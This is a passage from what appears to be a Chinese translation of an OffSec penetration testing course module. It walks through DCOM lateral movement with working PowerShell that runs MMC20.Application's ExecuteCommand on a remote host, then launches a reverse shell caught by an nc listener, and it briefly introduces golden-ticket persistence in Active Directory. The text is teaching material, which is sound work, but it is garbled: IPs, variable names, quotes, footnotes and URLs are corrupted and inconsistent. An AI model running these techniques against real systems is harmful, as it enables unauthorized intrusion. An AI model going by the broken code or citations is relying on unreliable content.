

![](img/336d6ea891e7464f18ad64426619ced4_793_0.png)

## 23.1.6 DCOM

在本节中，我们将检查一种相当新的横向移动技术，该技术利用了分布式组件对象模型 (DCOM)$^{1152}$ 并学习如何将其用于横向移动。$^{1153}$

微软组件对象模型 (COM)$^{1154}$ 是一种用于创建相互交互软件程序的系统。虽然 COM 是为了同进程或跨进程交互而创建，但它被扩展为分布式组件对象模型 (DCOM)，用于网络上多台计算机之间的交互。

COM 和 DCOM 都是追溯到 Windows 最早版本的旧技术，$^{1155}$ 与 DCOM 的交互通过 TCP 端口 135  RPC 执行，并且需要本地管理员权限来调用 DCOM 服务控制管理器，该管理器本质上是一个 API。

Cyberdemond$^{1156}$ 是各种 DCOM 横向移动技术的集合，其中一种由 Matt Nelson$^{1157}$ 发现，我们将在本节中介绍它。

发现的 DCOM 横向移动技术基于微软管理控制台 (MMC)$^{1158}$ COM 应用程序，它用于 Windows 系统的脚本化自动化。

MMC Application 类允许创建应用程序对象，$^{1159}$ 这些对象通过 Document ActiveX 属性暴露 `ExecuteCommand` 方法。正如名称所示，只要经过验证的用户具有权限（这是本地管理员的默认权限），该方法允许执行任何 shell 命令。

我们将以从已攻破的 Windows 11 CLIENT 主机登录的 jen 身份演示这种横向移动攻击。

从具有提升权限的 PowerShell 脚本，我们可以通过将 FILES04 的目标 IP 指定为 `GetTypeFromProgID` 方法的第二个参数，实例化远程 MMC 2.0。

```powershell
$dcom = [System.Activator]::CreateInstance([type]):GetTypeFromProgID("MMC20.Application.1","19.168.50.73")
```

| 852 - 远程实例化 MMC 应用程序对象 |
| :--- |
| 1152 (Microsoft, 2022), https://msdn.microsoft.com/en-us/library/cc26801.aspx |
| 1153 (MITRE, 2022), https://attack.mitre.org/techniques/T1021/001/ |
| 1154 (Microsoft, 2022), https://learn.microsoft.com/en-us/windows/32/component-object-model-portal/?redirectfrom=MSDN |
| 1155 (Wikipedia, 2023), https://en.wikipedia.org/wiki/Component_Object_Model |
| 1156 (Cyberdemond, 2018), https://www.cyberasion.com/blog/dcom-lateral-movement-techniques |
| 1157 (Matt Nelson, 2017), https://enigma03.net/2017/01/05/lateral-movement-using-the-mmc20-application-object/ |
| 1158 (Microsoft, 2022), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc-management-console-start/ |
| 1159 (Microsoft, 2022), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mmc-application-object?redirectfrom=MSDN |

# OffSec

使用 Kali Linux 进行渗透测试

一旦应用程序对象保存到 $Sdom 变量中，我们就可以通过 `ExecuteCommand`¹¹⁶⁰ 方法将所需的参数传递给应用程序。该方法接受四个参数：Command、Directory、Parameters 和 WindowState。我们对第一个和第三个参数感兴趣，它们将分别作为 `cmd` 和 `/c cal` 传递。

```powershell
$cdom.Document.Activeview.ExecuteCommand("cmd",null,/c cal")
```

列表 853 - 在远程 DCOM 对象上执行命令

一旦我们从 CLIENT 获取了两行 PowerShell 代码，我们就会启动一个计算器应用程序的实例。

由于它在 Session 0 中，我们可以使用 `tasklist` 验证计算器正在运行，并用 `findstr` 过滤输出。

```cmd
C:\Users\Administrator>tasklist | findstr "calc"
win32calc.exe                4764 Services                12,132 K
```

列表 854 - 验证计算器在 FILES04 上运行

我们可以通过将此攻击扩展到完全的反向 shell 来改进我们的方法，类似于我们在本模块之前的 WMI 和 WinRM 会话中所做的那样。

用我们的 Python 脚本生成 base64 编码的反向 shell 后，可以用它替换 DCOM 负载。

```powershell
$cdom.Document.Activeview.ExecuteCommand("powershell"
```

列表 855 - 在 CLIENT 上通过 DCOM 负载获取反向 shell

切换到 kali linux，我们可以同时验证任何进入 CLIENT 的连接

```bash
kali@linux:~ nc -lnvp 443
listening on (any :443)
connect to [192.168.1.50] from (UNKNOWN) [192.168.50.73] 50778
```

```powershell
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> hostname
FILES04
```

列表 856 - 通过 DCOM 本地获取反向 shell

太棒了，通过绕过 DCOM MMC 应用程序在内部网络中获得了立脚点。

在本单元中，我们学习了许多横向移动攻击背后的理论，以及如何从被攻破的客户端执行它们。

¹⁶⁰ (Microsoft, 2022), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/mvc-executescommand

接下来，我们将发现如何通过持久化技术在目标网络上维持访问。

## 23.2 Active Directory持久化

本单元涵盖了以下学习目标：

- 理解持久化技术的通用目的
- 利用黄金票据（golden tickets）作为持久化攻击
- 学习影子副本（shadow copies）以及如何将其滥用于持久化

一旦攻击者获得了单个或多个主机的访问权限，他们就希望维持访问以延长操作范围。这意味着攻击者对目标网络的访问必须在重启或凭据更改后继续。MITRE 将持久化战术¹⁶¹ 定义为维持攻击者在目标网络上立脚点的一系列技术。

我们可以在 Active Directory 环境中使用传统的持久化方法，但也可以获取 AD 特有的持久化。注意，在真实世界的渗透测试或红队行动中，持久化不在范围内，因为评估完成后可能会移除。

在下一个单元中，我们将探索如何利用黄金票据和影子副本技术保留访问。

### 23.2.1 黄金票据 (Golden Ticket)

回到 Kerberos 认证的解释，我们想起用户提交 TGT 请求时，KDC 使用域内 KDC 已知的密钥加密。该密钥是 krbtgt 域帐户的密码哈希。⁶⁶²

如果我们能够获取 krbtgt 密码哈希，就可以创建自己生成的 TGT，也称为黄金票据。这种技术的名称与我们遇到的银色票据（Silver Ticket）相似，黄金票据提供了对域的访问。

例如，我们可以创建一个 TGT，说明非特权用户是域组的成员，域控制器将因为加密正确而信任它。

我们必须小心保护被盗的 krbtgt 哈希，因为它们提供了无限的域访问权限。事实上，除非指定，否则此密码不会自动更改。

> 域功能级¹⁶⁴ 决定了域的能力，并决定了哪些 Windows 操作系统可以在域控制器上运行。更高的功能级别启用了额外的功能、功能安全缓解措施。

¹⁶⁶ (MITRE, 2022), https://attack.mitre.org/tactics/TA0003
¹⁶² (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows-server/ad-ds/kerberos
¹⁶³ (A. Blackwell, B. Delpy, 2014), https://www.blackhat.com/docs/us14/materials/us14-Abusing-Kerberos

